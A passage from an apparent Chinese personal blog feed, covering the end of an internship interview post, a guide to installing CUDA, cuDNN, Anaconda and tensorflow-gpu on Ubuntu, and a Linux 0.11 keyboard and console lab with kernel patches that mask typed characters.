title="提问"></a>提问</h2><ul><li>实习地点</li></ul><p>最终在<code>4-25</code>收到了offer call，确认了一下薪资福利，实习时间等。总的来说，今年春招实习投递经历主要是积攒经验了，最开始的两家准备不足，被挂的挺惨。之后面向面试学习了一段时间才拿到这个offer。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 面经 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后端开发 </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu安装tf-gpu</title>
      <link href="2019/02/01/ubuntu-an-zhuang-tf-gpu/"/>
      <url>2019/02/01/ubuntu-an-zhuang-tf-gpu/</url>
      
        <content type="html"><![CDATA[<h1 id="显卡驱动"><a href="#显卡驱动" class="headerlink" title="显卡驱动"></a>显卡驱动</h1><p>最新的18.04.3已经可以安装430驱动</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install nvidia-driver-430</span><br></pre></td></tr></tbody></table></figure><p><img src="driver1.png" alt=""></p><h1 id="安装要求"><a href="#安装要求" class="headerlink" title="安装要求"></a>安装要求</h1><p>官网有安装所需<a href="https://tensorflow.google.cn/install/gpu">软件要求</a><br><img src="tensor1.png" alt=""></p><h1 id="安装cuda及其组件"><a href="#安装cuda及其组件" class="headerlink" title="安装cuda及其组件"></a>安装cuda及其组件</h1><p>去官网下载<a href="https://developer.nvidia.com/cuda-10.0-download-archive">cuda安装runfile及其补丁</a>，</p><a id="more"></a><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Add NVIDIA package repository</span></span><br><span class="line">chmod +x ./cuda_10.0.130_410.48_linux.run ./cuda_10.0.130.1_linux.run</span><br><span class="line">sudo ./cuda_10.0.130_410.48_linux.run</span><br><span class="line">sudo ./cuda_10.0.130.1_linux.run</span><br></pre></td></tr></tbody></table></figure><p>注意不要重复安装nvidia显卡驱动。<br>然后下载<a href="https://developer.nvidia.com/rdp/cudnn-archive">cudnn</a>.</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf cudnn-10.0-linux-x64-v7.6.2.24.tgz</span><br><span class="line">sudo cp cuda/include/cudnn.h /usr/<span class="built_in">local</span>/cuda/include</span><br><span class="line">sudo cp cuda/lib64/libcudnn* /usr/<span class="built_in">local</span>/cuda/lib64</span><br><span class="line">sudo chmod a+r /usr/<span class="built_in">local</span>/cuda/include/cudnn.h /usr/<span class="built_in">local</span>/cuda/lib64/libcudnn*</span><br></pre></td></tr></tbody></table></figure><p>然后设置环境变量(cuda安装完成时会提示)</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=/usr/<span class="built_in">local</span>/cuda/bin/:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">export</span> LD_LIBRARY_PATH=<span class="variable">$LD_LIBRARY_PATH</span>:/usr/<span class="built_in">local</span>/cuda/extras/CUPTI/lib64</span><br></pre></td></tr></tbody></table></figure><p>检验下安装</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wmc@omen:~$ nvcc -V</span><br><span class="line">nvcc: NVIDIA (R) Cuda compiler driver</span><br><span class="line">Copyright (c) 2005-2018 NVIDIA Corporation</span><br><span class="line">Built on Sat_Aug_25_21:08:01_CDT_2018</span><br><span class="line">Cuda compilation tools, release 10.0, V10.0.130</span><br></pre></td></tr></tbody></table></figure><h1 id="Anaconda"><a href="#Anaconda" class="headerlink" title="Anaconda"></a>Anaconda</h1><p>Anaconda安装十分简单.去喜闻乐见的<a href="https://mirrors.tuna.tsinghua.edu.cn/anaconda/archive/Anaconda3-2019.07-Linux-x86_64.sh">tuna</a>下载。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x Anaconda3-2019.07-Linux-x86_64.sh</span><br><span class="line">./Anaconda3-2019.07-Linux-x86_64.sh</span><br></pre></td></tr></tbody></table></figure><p>更换anaconda和pip镜像源</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/</span><br><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main/</span><br><span class="line">conda config --<span class="built_in">set</span> show_channel_urls yes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pip install pip -U</span><br><span class="line">pip config <span class="built_in">set</span> global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></tbody></table></figure><p>安装完成后，我们使用创建一个新的python虚拟环境，安装tensorflow-gpu.</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">conda create -n tensor pip python=3.6</span><br><span class="line"><span class="built_in">source</span> activate tensor</span><br><span class="line">pip install --upgrade tensorflow-gpu</span><br></pre></td></tr></tbody></table></figure><h2 id="安装jupyter插件"><a href="#安装jupyter插件" class="headerlink" title="安装jupyter插件"></a>安装jupyter插件</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">conda install -c conda-forge jupyter_contrib_nbextensions</span><br><span class="line">jupyter contrib nbextension install --user</span><br></pre></td></tr></tbody></table></figure><h2 id="将conda虚拟环境作为jupyter内核"><a href="#将conda虚拟环境作为jupyter内核" class="headerlink" title="将conda虚拟环境作为jupyter内核"></a>将conda虚拟环境作为jupyter内核</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">conda activate tensorflowenv</span><br><span class="line">pip install ipykernel</span><br><span class="line">python -m ipykernel install --user --name tensorflowenv --display-name <span class="string">"Python (tensorflowenv)"</span></span><br></pre></td></tr></tbody></table></figure><h1 id="示例测试"><a href="#示例测试" class="headerlink" title="示例测试"></a>示例测试</h1><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line">mnist = tf.keras.datasets.mnist</span><br><span class="line"></span><br><span class="line">(x_train, y_train),(x_test, y_test) = mnist.load_data()</span><br><span class="line">x_train, x_test = x_train / <span class="number">255.0</span>, x_test / <span class="number">255.0</span></span><br><span class="line"></span><br><span class="line">model = tf.keras.models.Sequential([</span><br><span class="line">  tf.keras.layers.Flatten(input_shape=(<span class="number">28</span>, <span class="number">28</span>)),</span><br><span class="line">  tf.keras.layers.Dense(<span class="number">128</span>, activation=<span class="string">'relu'</span>),</span><br><span class="line">  tf.keras.layers.Dropout(<span class="number">0.2</span>),</span><br><span class="line">  tf.keras.layers.Dense(<span class="number">10</span>, activation=<span class="string">'softmax'</span>)</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">model.compile(optimizer=<span class="string">'adam'</span>,</span><br><span class="line">              loss=<span class="string">'sparse_categorical_crossentropy'</span>,</span><br><span class="line">              metrics=[<span class="string">'accuracy'</span>])</span><br><span class="line"></span><br><span class="line">model.fit(x_train, y_train, epochs=<span class="number">5</span>)</span><br><span class="line">model.evaluate(x_test, y_test)</span><br></pre></td></tr></tbody></table></figure><p>运行结果<br><img src="run1.png" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tensorflow-gpu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CS:APP 北邮 I/O_lab</title>
      <link href="2018/12/28/cs-app-i-o-lab/"/>
      <url>2018/12/28/cs-app-i-o-lab/</url>
      
        <content type="html"><![CDATA[<h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><p>本次试验中，主要涉及keyboard.S，tty_io.c，console.c。其中：keyboard.S主要实现键盘中断处理过程，当按下键盘时，出发中断，由对应函数进行处理，并将字符放入read_q写队列中；tty_io.c包含tty字符设备读函数tty_read()和tty_write()，为文件系统提供了上层访问接口，copy_to_cooked()将输入字符处理后添加到tty辅助队列secondary中，若开启了回显功能，则还会将其添加到write_q写队列中，由console.c中的con_write()函数中写入到终端。<br><img src="lab4.png" alt=""></p><p><img src="struct.png" alt=""></p><a id="more"></a><h2 id="phase1"><a href="#phase1" class="headerlink" title="phase1"></a>phase1</h2><p>此关要求将f12作为一个开关，用于启用/关闭*模式，我们需要加一个全局变量用以标示是否开启改模式。首先需要对keyboard.S进行改动，使按下f12时执行正确的中断调用。我们可以见得，functions按键由func函数进行处理，当检测到按下的为f12时，调用change_f12Flag()函数更改标志变量f12Flag。</p><p><img src="keyboard.png" alt=""></p><p>我们在f12中声明f12Flag，并且将该函数放置在其中，供keyboard.S调用处理按下f12的情况。</p><p><img src="tty.png" alt=""></p><p>并且在console.c中引入外部变量f12Flag，对输出加以更改。当f12Flag非0时，将姓名拼音首位字母变为*。</p><p><img src="con_w.png" alt=""></p><p>至此，修改完成，我们make生成image之后，运行./run脚本，开启boch虚拟机。</p><p><img src="run.png" alt=""></p><p>运行正确。</p><h2 id="phase2"><a href="#phase2" class="headerlink" title="phase2"></a>phase2</h2><p>此阶段，和phase1相似，只是将开启/关闭条件改为了学号/学号-。那么我们在tty_io.c中加入一个有限状态自动机即可，copy_to_cooked()会将输入字符加入到tty辅助队列和tty写入队列，我们状态机代码放在此处,，以变量leng_fit表示状态，根据输入字符更改状态。</p><p><img src="long_fit.png" alt=""></p><p><img src="machine.png" alt=""></p><p>然后我们在console.c中引入外部变量leng_fit，当leng_fit为10时，改变输出。</p><p><img src="con2.png" alt=""></p><p>我们make后运行。</p><p><img src="run2.png" alt=""></p><p>成功。</p><h2 id="制作补丁"><a href="#制作补丁" class="headerlink" title="制作补丁"></a>制作补丁</h2><p>为了方便保存更改后的代码，我们使用diff指令制作补丁，方便以后使用patch恢复。</p><p>生成补丁如下。</p><p>phase1.patch</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">diff -ru linux<span class="number">-0.11</span>-bk/kernel/chr_drv/console.c linux<span class="number">-0.11</span>/kernel/chr_drv/console.c</span><br><span class="line">--- linux<span class="number">-0.11</span>-bk/kernel/chr_drv/console.c<span class="number">2008</span><span class="number">-08</span><span class="number">-28</span> <span class="number">13</span>:<span class="number">14</span>:<span class="number">58.000000000</span> +<span class="number">0800</span></span><br><span class="line">+++ linux<span class="number">-0.11</span>/kernel/chr_drv/console.c<span class="number">2018</span><span class="number">-12</span><span class="number">-28</span> <span class="number">22</span>:<span class="number">25</span>:<span class="number">05.249893925</span> +<span class="number">0800</span></span><br><span class="line">@@ <span class="number">-54</span>,<span class="number">7</span> +<span class="number">54</span>,<span class="number">7</span> @@</span><br><span class="line"> <span class="meta">#<span class="meta-keyword">define</span> NPAR 16</span></span><br><span class="line"> </span><br><span class="line"> <span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">keyboard_interrupt</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line">-</span><br><span class="line">+<span class="keyword">extern</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> f12Flag;</span><br><span class="line"> <span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">char</span>video_type;<span class="comment">/* Type of display being used*/</span></span><br><span class="line"> <span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">long</span>video_num_columns;<span class="comment">/* Number of text columns*/</span></span><br><span class="line"> <span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">long</span>video_size_row;<span class="comment">/* Bytes per row*/</span></span><br><span class="line">@@ <span class="number">-450</span>,<span class="number">6</span> +<span class="number">450</span>,<span class="number">8</span> @@</span><br><span class="line"> nr = CHARS(tty-&gt;write_q);</span><br><span class="line"> <span class="keyword">while</span> (nr--) {</span><br><span class="line"> GETCH(tty-&gt;write_q,c);</span><br><span class="line">+<span class="keyword">if</span>(f12Flag &amp;&amp; (c == <span class="string">'w'</span> || c == <span class="string">'o'</span>))</span><br><span class="line">+c = <span class="string">'*'</span>;</span><br><span class="line"> <span class="keyword">switch</span>(state) {</span><br><span class="line"> <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line"> <span class="keyword">if</span> (c&gt;<span class="number">31</span> &amp;&amp; c&lt;<span class="number">127</span>) {</span><br><span class="line">diff -ru linux<span class="number">-0.11</span>-bk/kernel/chr_drv/keyboard.S linux<span class="number">-0.11</span>/kernel/chr_drv/keyboard.S</span><br><span class="line">--- linux<span class="number">-0.11</span>-bk/kernel/chr_drv/keyboard.S<span class="number">2008</span><span class="number">-08</span><span class="number">-28</span> <span class="number">13</span>:<span class="number">14</span>:<span class="number">58.000000000</span> +<span class="number">0800</span></span><br><span class="line">+++ linux<span class="number">-0.11</span>/kernel/chr_drv/keyboard.S<span class="number">2018</span><span class="number">-12</span><span class="number">-28</span> <span class="number">22</span>:<span class="number">25</span>:<span class="number">05.249893925</span> +<span class="number">0800</span></span><br><span class="line">@@ <span class="number">-224</span>,<span class="number">6</span> +<span class="number">224</span>,<span class="number">7</span> @@</span><br><span class="line"> jb end_func</span><br><span class="line"> cmpb $<span class="number">11</span>,%al</span><br><span class="line"> ja end_func</span><br><span class="line">+call change_f12Flag</span><br><span class="line"> ok_func:</span><br><span class="line"> cmpl $<span class="number">4</span>,%ecx<span class="comment">/* check that there is enough room */</span></span><br><span class="line"> jl end_func</span><br><span class="line">diff -ru linux<span class="number">-0.11</span>-bk/kernel/chr_drv/tty_io.c linux<span class="number">-0.11</span>/kernel/chr_drv/tty_io.c</span><br><span class="line">--- linux<span class="number">-0.11</span>-bk/kernel/chr_drv/tty_io.c<span class="number">2008</span><span class="number">-08</span><span class="number">-28</span> <span class="number">13</span>:<span class="number">14</span>:<span class="number">58.000000000</span> +<span class="number">0800</span></span><br><span class="line">+++ linux<span class="number">-0.11</span>/kernel/chr_drv/tty_io.c<span class="number">2018</span><span class="number">-12</span><span class="number">-28</span> <span class="number">22</span>:<span class="number">25</span>:<span class="number">05.249893925</span> +<span class="number">0800</span></span><br><span class="line">@@ <span class="number">-47</span>,<span class="number">7</span> +<span class="number">47</span>,<span class="number">7</span> @@</span><br><span class="line"> <span class="meta">#<span class="meta-keyword">define</span> O_CRNL(tty)_O_FLAG((tty),OCRNL)</span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">define</span> O_NLRET(tty)_O_FLAG((tty),ONLRET)</span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">define</span> O_LCUC(tty)_O_FLAG((tty),OLCUC)</span></span><br><span class="line">-</span><br><span class="line">+<span class="keyword">unsigned</span> <span class="keyword">char</span> f12Flag;</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> <span class="title">tty_table</span>[] = {</span></span><br><span class="line"> {</span><br><span class="line"> {ICRNL,<span class="comment">/* change incoming CR to NL */</span></span><br><span class="line">@@ <span class="number">-348</span>,<span class="number">3</span> +<span class="number">348</span>,<span class="number">7</span> @@</span><br><span class="line"> <span class="function"><span class="keyword">void</span> <span class="title">chr_dev_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"> </span>{</span><br><span class="line"> }</span><br><span class="line">+<span class="function"><span class="keyword">void</span> <span class="title">change_f12Flag</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line">+{</span><br><span class="line">+f12Flag = ~f12Flag;</span><br><span class="line">+}</span><br></pre></td></tr></tbody></table></figure><p>phase2.patch</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">diff -ru linux<span class="number">-0.11</span>-bk/kernel/chr_drv/console.c linux<span class="number">-0.11</span>/kernel/chr_drv/console.c</span><br><span class="line">--- linux<span class="number">-0.11</span>-bk/kernel/chr_drv/console.c<span class="number">2008</span><span class="number">-08</span><span class="number">-28</span> <span class="number">13</span>:<span class="number">14</span>:<span class="number">58.000000000</span> +<span class="number">0800</span></span><br><span class="line">+++ linux<span class="number">-0.11</span>/kernel/chr_drv/console.c<span class="number">2018</span><span class="number">-12</span><span class="number">-28</span> <span class="number">18</span>:<span class="number">23</span>:<span class="number">00.272667952</span> +<span class="number">0800</span></span><br><span class="line">@@ <span class="number">-54</span>,<span class="number">6</span> +<span class="number">54</span>,<span class="number">7</span> @@</span><br><span class="line"> <span class="meta">#<span class="meta-keyword">define</span> NPAR 16</span></span><br><span class="line"> </span><br><span class="line"> <span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">keyboard_interrupt</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line">+<span class="keyword">extern</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> leng_fit;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">char</span>video_type;<span class="comment">/* Type of display being used*/</span></span><br><span class="line"> <span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">long</span>video_num_columns;<span class="comment">/* Number of text columns*/</span></span><br><span class="line">@@ <span class="number">-448</span>,<span class="number">8</span> +<span class="number">449</span>,<span class="number">13</span> @@</span><br><span class="line"> <span class="keyword">char</span> c;</span><br><span class="line"> </span><br><span class="line"> nr = CHARS(tty-&gt;write_q);</span><br><span class="line">+</span><br><span class="line">+</span><br><span class="line"> <span class="keyword">while</span> (nr--) {</span><br><span class="line"> GETCH(tty-&gt;write_q,c);</span><br><span class="line">+</span><br><span class="line">+<span class="keyword">if</span>((c == <span class="number">119</span> || c == <span class="number">111</span>) &amp;&amp; leng_fit == <span class="number">10</span>)</span><br><span class="line">+                c = <span class="string">'*'</span>;</span><br><span class="line"> <span class="keyword">switch</span>(state) {</span><br><span class="line"> <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line"> <span class="keyword">if</span> (c&gt;<span class="number">31</span> &amp;&amp; c&lt;<span class="number">127</span>) {</span><br><span class="line">diff -ru linux<span class="number">-0.11</span>-bk/kernel/chr_drv/tty_io.c linux<span class="number">-0.11</span>/kernel/chr_drv/tty_io.c</span><br><span class="line">--- linux<span class="number">-0.11</span>-bk/kernel/chr_drv/tty_io.c<span class="number">2008</span><span class="number">-08</span><span class="number">-28</span> <span class="number">13</span>:<span class="number">14</span>:<span class="number">58.000000000</span> +<span class="number">0800</span></span><br><span class="line">+++ linux<span class="number">-0.11</span>/kernel/chr_drv/tty_io.c<span class="number">2018</span><span class="number">-12</span><span class="number">-28</span> <span class="number">18</span>:<span class="number">22</span>:<span class="number">43.084621806</span> +<span class="number">0800</span></span><br><span class="line">@@ <span class="number">-47</span>,<span class="number">7</span> +<span class="number">47</span>,<span class="number">7</span> @@</span><br><span class="line"> <span class="meta">#<span class="meta-keyword">define</span> O_CRNL(tty)_O_FLAG((tty),OCRNL)</span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">define</span> O_NLRET(tty)_O_FLAG((tty),ONLRET)</span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">define</span> O_LCUC(tty)_O_FLAG((tty),OLCUC)</span></span><br><span class="line">-</span><br><span class="line">+<span class="keyword">unsigned</span> <span class="keyword">int</span> leng_fit = <span class="number">0</span>;</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> <span class="title">tty_table</span>[] = {</span></span><br><span class="line"> {</span><br><span class="line"> {ICRNL,<span class="comment">/* change incoming CR to NL */</span></span><br><span class="line">@@ <span class="number">-148</span>,<span class="number">6</span> +<span class="number">148</span>,<span class="number">70</span> @@</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">while</span> (!EMPTY(tty-&gt;read_q) &amp;&amp; !FULL(tty-&gt;secondary)) {</span><br><span class="line"> GETCH(tty-&gt;read_q,c);</span><br><span class="line">+<span class="keyword">switch</span>(leng_fit){</span><br><span class="line">+    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">+<span class="keyword">if</span>(c == <span class="number">50</span>)</span><br><span class="line">+    leng_fit++;</span><br><span class="line">+<span class="keyword">break</span>;</span><br><span class="line">+    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">+<span class="keyword">if</span>(c == <span class="number">48</span>)</span><br><span class="line">+    leng_fit++;</span><br><span class="line">+<span class="keyword">else</span></span><br><span class="line">+    leng_fit = <span class="number">0</span>;</span><br><span class="line">+<span class="keyword">break</span>;</span><br><span class="line">+    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">+<span class="keyword">if</span>(c == <span class="number">49</span>)</span><br><span class="line">+    leng_fit++;</span><br><span class="line">+<span class="keyword">else</span></span><br><span class="line">+    leng_fit = <span class="number">0</span>;</span><br><span class="line">+<span class="keyword">break</span>;</span><br><span class="line">+    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">+<span class="keyword">if</span>(c == <span class="number">55</span>)</span><br><span class="line">+    leng_fit++;</span><br><span class="line">+<span class="keyword">else</span></span><br><span class="line">+    leng_fit = <span class="number">0</span>;</span><br><span class="line">+<span class="keyword">break</span>;</span><br><span class="line">+    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">+<span class="keyword">if</span>(c == <span class="number">50</span>)</span><br><span class="line">+    leng_fit++;</span><br><span class="line">+<span class="keyword">else</span></span><br><span class="line">+    leng_fit = <span class="number">0</span>;</span><br><span class="line">+<span class="keyword">break</span>;</span><br><span class="line">+    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">+<span class="keyword">if</span>(c == <span class="number">49</span>)</span><br><span class="line">+    leng_fit++;</span><br><span class="line">+<span class="keyword">else</span></span><br><span class="line">+    leng_fit = <span class="number">0</span>;</span><br><span class="line">+<span class="keyword">break</span>;</span><br><span class="line">+    <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">+<span class="keyword">if</span>(c == <span class="number">49</span>)</span><br><span class="line">+    leng_fit++;</span><br><span class="line">+<span class="keyword">else</span></span><br><span class="line">+    leng_fit = <span class="number">0</span>;</span><br><span class="line">+<span class="keyword">break</span>;</span><br><span class="line">+    <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">+<span class="keyword">if</span>(c == <span class="number">53</span>)</span><br><span class="line">+    leng_fit++;</span><br><span class="line">+<span class="keyword">else</span></span><br><span class="line">+    leng_fit = <span class="number">0</span>;</span><br><span class="line">+<span class="keyword">break</span>;</span><br><span class="line">+    <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">+<span class="keyword">if</span>(c == <span class="number">50</span>)</span><br><span class="line">+    leng_fit++;</span><br><span class="line">+<span class="keyword">else</span></span><br><span class="line">+    leng_fit = <span class="number">0</span>;</span><br><span class="line">+<span class="keyword">break</span>;</span><br><span class="line">+    <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">+<span class="keyword">if</span>(c == <span class="number">51</span>)</span><br><span class="line">+    leng_fit++;</span><br><span class="line">+<span class="keyword">else</span></span><br><span class="line">+    leng_fit = <span class="number">0</span>;</span><br><span class="line">+<span class="keyword">break</span>;</span><br><span class="line">+    <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">+<span class="keyword">if</span>(c == <span class="number">45</span>)</span><br><span class="line">+    leng_fit = <span class="number">0</span>;</span><br><span class="line">+<span class="keyword">break</span>;     </span><br><span class="line">+}</span><br><span class="line"> <span class="keyword">if</span> (c==<span class="number">13</span>)</span><br><span class="line"> <span class="keyword">if</span> (I_CRNL(tty))</span><br><span class="line"> c=<span class="number">10</span>;</span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CS:APP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CS:APP </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python ElementTree数据清洗</title>
      <link href="2018/12/09/python-elementtree-shu-ju-qing-xi/"/>
